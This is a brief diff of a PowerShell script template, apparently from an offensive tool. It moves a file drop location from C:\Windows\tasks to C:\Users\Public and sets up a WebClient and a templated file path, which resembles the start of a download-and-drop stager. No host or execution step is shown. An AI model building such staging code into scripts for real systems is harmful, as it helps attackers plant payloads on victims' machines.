@@ -1,4 +1,4 @@
-$path = "C:\Windows\tasks"
+$path = "C:\Users\Public"
 $wc = New-Object net.webclient
 $baseFileName = {{psq .Name}}
 $fullPath = Join-Path $path $baseFileName
